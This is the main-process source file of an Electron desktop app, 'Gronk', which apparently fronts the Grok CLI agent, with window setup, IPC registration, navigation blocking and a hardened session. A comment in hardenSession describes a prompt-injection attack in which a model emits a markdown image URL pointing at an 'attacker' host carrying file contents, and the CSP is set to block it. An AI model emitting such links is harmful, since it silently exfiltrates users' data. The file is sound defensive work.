import { app, BrowserWindow, Menu, session, shell } from 'electron'
import path from 'node:path'
import { agentManager } from './agent-manager'
import { getAuthStatus, invalidateAuthCache } from './auth'
import { shouldRefreshOnFocus } from './auth-decision'
import { invalidateCliVersionCache } from './cli-version'
import { installContextMenu } from './context-menu'
import { isAllowedExternalUrl, isAppUrl } from './ipc-guard'
import { initPreview, stopPreview } from './preview'
import { registerAgentIpc } from './ipc/agent'
import { registerDataLocationIpc } from './ipc/data-location'
import { registerFilesIpc } from './ipc/files'
import { registerPluginsIpc } from './ipc/plugins'
import { registerGitIpc } from './ipc/git'
import { registerPreviewIpc } from './ipc/preview'
import { registerSessionsIpc } from './ipc/sessions'
import { registerSettingsIpc } from './ipc/settings'
import { registerSystemIpc } from './ipc/system'
import type { IpcContext } from './ipc/context'

const gotLock = app.requestSingleInstanceLock()
if (!gotLock) {
  app.quit()
}

let mainWindow: BrowserWindow | null = null

/**
 * Floor between focus-triggered auth re-probes. Long enough that alt-tabbing
 * does not turn into request traffic, short enough that coming back from a
 * terminal where you just installed or signed in re-reads on arrival.
 */
const FOCUS_REFRESH_MIN_MS = 5_000
let lastFocusRefreshAt: number | null = null

/**
 * The whole of index.ts that the IPC modules can see. Handlers ask for the
 * window when they run rather than being handed one at registration, because
 * registration happens once and the window can be replaced (see IpcContext).
 */
const ipcContext: IpcContext = {
  getMainWindow: () => mainWindow
}

/** isAppUrl with this process's dev-server env applied. */
function isAppUrlLocal(target: string): boolean {
  return isAppUrl(target, process.env.ELECTRON_RENDERER_URL)
}

function openExternalSafely(target: string): void {
  if (isAllowedExternalUrl(target)) void shell.openExternal(target)
}

function createWindow(): void {
  mainWindow = new BrowserWindow({
    width: 1320,
    height: 860,
    minWidth: 900,
    minHeight: 600,
    title: 'Gronk',
    backgroundColor: '#000000',
    show: false,
    titleBarStyle:
      process.platform === 'darwin'
        ? 'hiddenInset'
        : process.platform === 'win32'
          ? 'hidden'
          : 'default',
    trafficLightPosition: process.platform === 'darwin' ? { x: 16, y: 16 } : undefined,
    // Windows: draw our own dark title bar; keep native min/max/close as an overlay
    ...(process.platform === 'win32'
      ? { titleBarOverlay: { color: '#0a0a0a', symbolColor: '#e5e5e5', height: 40 } }
      : {}),
    webPreferences: {
      preload: path.join(__dirname, '../preload/index.js'),
      contextIsolation: true,
      nodeIntegration: false,
      // sandbox:true blanks the UI with electron-vite preload on Windows; keep isolation + no node
      sandbox: false
    }
  })

  agentManager.setWindow(mainWindow)
  initPreview(mainWindow, (channel, payload) => {
    if (!mainWindow || mainWindow.isDestroyed()) return
    if (channel === 'preview-status') {
      mainWindow.webContents.send('gronk:event', {
        type: 'preview-status',
        ...(payload as Record<string, unknown>)
      })
    } else if (channel === 'preview-log') {
      mainWindow.webContents.send('gronk:event', { type: 'preview-log', text: String(payload) })
    }
  })

  mainWindow.on('ready-to-show', () => {
    mainWindow?.show()
  })

  /**
   * Re-probe sign-in state when the window comes back to the front.
   *
   * A mac tester installed the Grok CLI while Gronk was open and Gronk went on
   * saying it was not installed. Nothing here polls, and nothing watches the
   * filesystem, so a change made in a terminal is invisible until something
   * happens to ask again. Alt-tabbing back is the moment the user expects the
   * app to have noticed.
   *
   * The auth probe spawns the CLI and makes a network call, so this is throttled
   * rather than run on every focus. The cli-version cache is invalidated too:
   * its TTL is five minutes, long enough that a fresh install looks permanent.
   */
  mainWindow.on('focus', () => {
    const now = Date.now()
    if (!shouldRefreshOnFocus(lastFocusRefreshAt, now, FOCUS_REFRESH_MIN_MS)) return
    lastFocusRefreshAt = now
    invalidateAuthCache()
    invalidateCliVersionCache()
    void getAuthStatus()
      .then((auth) => {
        if (!mainWindow || mainWindow.isDestroyed()) return
        mainWindow.webContents.send('gronk:event', { type: 'auth', auth })
      })
      .catch(() => {
        /* a failed probe must not take the window down; the next focus retries */
      })
  })
  // Fallback if ready-to-show never fires (blank window reports)
  setTimeout(() => {
    if (mainWindow && !mainWindow.isDestroyed() && !mainWindow.isVisible()) {
      mainWindow.show()
    }
  }, 2500)

  mainWindow.webContents.setWindowOpenHandler(({ url }) => {
    openExternalSafely(url)
    return { action: 'deny' }
  })

  const blockOffOriginNav = (e: Electron.Event, url: string): void => {
    if (isAppUrlLocal(url)) return
    e.preventDefault()
    openExternalSafely(url)
  }
  mainWindow.webContents.on('will-navigate', blockOffOriginNav)
  mainWindow.webContents.on('will-redirect', blockOffOriginNav)
  mainWindow.webContents.on('will-attach-webview', (e) => e.preventDefault())
  // Right-click. Electron provides no menu of its own, so without this the
  // app has no cut, copy or paste and the spelling suggestions Chromium is
  // already computing cannot be reached.
  installContextMenu(mainWindow.webContents)

  mainWindow.webContents.on('did-fail-load', (_e, code, desc, url) => {
    console.error('[gronk] did-fail-load', code, desc, url)
  })
  mainWindow.webContents.on('render-process-gone', (_e, details) => {
    console.error('[gronk] render-process-gone', details)
  })

  // DevTools in development so blank screens are diagnosable
  if (process.env.ELECTRON_RENDERER_URL) {
    mainWindow.webContents.openDevTools({ mode: 'detach' })
  }

  if (process.env.ELECTRON_RENDERER_URL) {
    void mainWindow.loadURL(process.env.ELECTRON_RENDERER_URL)
  } else {
    void mainWindow.loadFile(path.join(__dirname, '../renderer/index.html'))
  }

  mainWindow.on('closed', () => {
    stopPreview()
    mainWindow = null
    agentManager.setWindow(null)
  })
}

/**
 * Every renderer-reachable endpoint the app has, grouped by domain under ./ipc.
 * Each module guards every handler with assertTrustedSender before doing
 * anything else — that check is the boundary, not a formality.
 */
function registerIpc(): void {
  registerAgentIpc()
  registerSessionsIpc(ipcContext)
  registerSettingsIpc()
  registerSystemIpc(ipcContext)
  registerFilesIpc(ipcContext)
  registerDataLocationIpc(ipcContext)
  registerPreviewIpc()
  registerPluginsIpc()
  registerGitIpc()
}

function hardenSession(): void {
  // CSP on both dev and prod. Dev relaxes only what Vite HMR needs,
  // and is otherwise identical so a policy problem cannot hide until packaging.
  //
  // img-src deliberately EXCLUDES https:. The renderer displays model output as
  // markdown, and an <img> is fetched the moment it renders — so a
  // prompt-injected model could emit ![](https://attacker/?d=<file contents>)
  // and the data would leave silently, with no click. Markdown.tsx offers remote
  // images as links instead; this line is what makes a missed path fail closed.
  // data: and blob: stay, because generated images arrive as data: URLs from
  // readLocalImage and are never fetched over the network.
  //
  // This does NOT affect the preview pane. That runs on its own session
  // partition, which hardenSession never touches, so a user's dev server renders
  // whatever it likes.
  const isDev = !!process.env.ELECTRON_RENDERER_URL
  const csp = isDev
    ? [
        "default-src 'self'",
        // Vite injects module scripts + react-refresh; HMR needs eval/ws
        "script-src 'self' 'unsafe-inline' 'unsafe-eval'",
        "style-src 'self' 'unsafe-inline'",
        "font-src 'self' data:",
        "img-src 'self' data: blob:",
        "connect-src 'self' http://localhost:* http://127.0.0.1:* ws://localhost:* ws://127.0.0.1:*",
        "object-src 'none'",
        "base-uri 'none'",
        "frame-ancestors 'none'"
      ].join('; ')
    : [
        "default-src 'self'",
        "script-src 'self'",
        "style-src 'self' 'unsafe-inline'",
        "font-src 'self' data:",
        "img-src 'self' data: blob:",
        "connect-src 'self'",
        "object-src 'none'",
        "base-uri 'none'",
        "frame-ancestors 'none'"
      ].join('; ')

  session.defaultSession.webRequest.onHeadersReceived((details, cb) => {
    cb({
      responseHeaders: {
        ...details.responseHeaders,
        'Content-Security-Policy': [csp]
      }
    })
  })

  // Deny web permissions by default. Clipboard write is the exception: the UI
  // has explicit Copy buttons (code blocks, export path) that use the Clipboard
  // API, and Chromium will not write without these checks returning true.
  // Preview stays fully denied in preview.ts — that session must not get this.
  const clipboardOk = (permission: string): boolean =>
    permission === 'clipboard-sanitized-write' ||
    permission === 'clipboard-write' ||
    permission === 'clipboard-read'

  session.defaultSession.setPermissionRequestHandler((_wc, permission, cb) => {
    cb(clipboardOk(permission))
  })
  session.defaultSession.setPermissionCheckHandler((_wc, permission) => clipboardOk(permission))
}

function setupApplicationMenu(): void {
  // Electron's stock "File / Edit / View / Window / Help" menu is not ours: it
  // advertises an unfinished app and its View submenu ships reload + devtools
  // accelerators we do not want reachable in a packaged build. Windows already
  // hid it behind the custom title bar; Linux never did, so it goes there too.
  // Dev devtools are opened explicitly in createWindow(), not from a menu.
  if (process.platform !== 'darwin') {
    Menu.setApplicationMenu(null)
    return
  }

  // macOS is the exception: Cmd+X/C/V/A/Z and Cmd+Q are delivered by menu item
  // *roles*, not by the renderer, so setting a null menu silently kills
  // copy/paste in every text input and leaves the app unquittable by keyboard.
  // Keep a minimal role-only menu instead — roles let the OS supply the labels,
  // accelerators and localization, and none of them navigate or open devtools.
  const template: Electron.MenuItemConstructorOptions[] = [
    {
      // macOS overrides this label with the bundle name; set it for parity anyway.
      label: app.name,
      submenu: [
        { role: 'about' },
        { type: 'separator' },
        { role: 'hide' },
        { role: 'hideOthers' },
        { role: 'unhide' },
        { type: 'separator' },
        { role: 'quit' }
      ]
    },
    {
      label: 'Edit',
      submenu: [
        { role: 'undo' },
        { role: 'redo' },
        { type: 'separator' },
        { role: 'cut' },
        { role: 'copy' },
        { role: 'paste' },
        { type: 'separator' },
        { role: 'selectAll' }
      ]
    },
    {
      // Cmd+W closes the window but not the app: window-all-closed skips quit on
      // darwin and the 'activate' handler below rebuilds the window from the dock.
      label: 'Window',
      submenu: [
        { role: 'minimize' },
        { role: 'zoom' },
        { type: 'separator' },
        { role: 'close' }
      ]
    }
  ]

  Menu.setApplicationMenu(Menu.buildFromTemplate(template))
}

app.whenReady().then(() => {
  hardenSession()
  setupApplicationMenu()
  registerIpc()
  createWindow()

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow()
  })
})

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    void agentManager.stop().finally(() => app.quit())
  }
})

app.on('before-quit', () => {
  void agentManager.stop()
})

app.on('second-instance', () => {
  if (mainWindow) {
    if (mainWindow.isMinimized()) mainWindow.restore()
    mainWindow.focus()
  }
})
